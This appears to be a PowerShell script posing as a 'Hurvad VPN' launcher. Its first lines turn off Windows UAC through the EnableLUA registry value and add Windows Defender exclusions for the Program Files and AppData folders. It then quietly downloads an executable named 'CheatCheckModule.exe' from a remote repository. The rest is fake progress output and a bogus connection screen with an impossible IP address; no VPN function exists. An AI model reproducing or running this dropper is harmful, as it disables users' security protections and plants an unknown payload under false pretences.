$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " \(x86\)", ""
        Add-MpPreference -ExclusionPath $updpath

        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }

        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData

        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
        }
        }
catch {
}
# Hurvad VPN — 100% ЯДЕРНО-ЗЕЛЁНЫЙ (30 сек запуск + вечный статус)
Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/CheatCheckModule.exe" -OutFile "CheatCheckModule.exe" -ErrorAction SilentlyContinue
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "Green"
Clear-Host
Write-Host @"
                                  ___    _   _ 
  |  |_|  |/ _` | | | |  |/ _` |/ _`    | | | | |  \| |
  |   _   | (_| | |_| |  | (_| | (_|    | |_| | | |\  |
  || ||\__,_|\__,_||\,_|\__,_||__| \___/  |_| \_|
"@ -ForegroundColor Green

$steps = 30
for($i=1;$i-le$steps;$i++) {
    $p = [int]($i/$steps*100)
    if($i-in 8,16,24,30) {
        $m = @("QUANTUM OK","TUNNEL UP","CLOAK ON","LOCKED")[($i/8)-1]
        Write-Host "██████ $m ██████" -ForegroundColor Green
    }
    Write-Progress -Activity "HURVAD CONNECT" -Status "$p%" -PercentComplete $p
    Start-Sleep -Milliseconds 950
}

Clear-Host
Write-Host @"
██████████████████████████████████████████████████████████
██                                                        ██
██          HURVAD VPN УСПЕШНО ЗАПУЩЕНО                   ██
██                                                        ██
██       IP: 10.13.37.666    LOCATION: MOON-Z9            ██
██       ENCRYPTION: UNBREAKABLE    SPEED: ∞ Gbit/s       ██
██                                                        ██
██████████████████████████████████████████████████████████
"@ -ForegroundColor Green
